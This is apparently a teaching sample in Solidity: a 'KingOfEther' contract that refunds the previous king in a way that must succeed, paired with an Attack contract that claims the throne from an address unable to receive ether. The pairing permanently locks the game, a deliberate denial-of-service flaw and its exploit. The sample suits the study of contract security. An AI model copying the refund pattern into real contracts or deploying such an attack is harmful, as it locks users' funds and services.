// SPDX-License-Identifier: MIT
pragma solidity ^0.8.19;

contract KingOfEther {
    address public king;
    uint public balance;

    function claimThrone() external payable {
        require(msg.value > balance, "Need to pay more become the king");

        (bool sent, ) = king.call{value: balance}("");
        require(sent, "failed to sent");

        balance = msg.value;
        king = msg.sender;
    }
}

contract Attack {
    KingOfEther kingOfEther;

    constructor(KingOfEther _kingOfEther) {
        kingOfEther = KingOfEther(_kingOfEther);
    }
    
    function attack() public payable {
        kingOfEther.claimThrone{value: msg.value}();
    }
}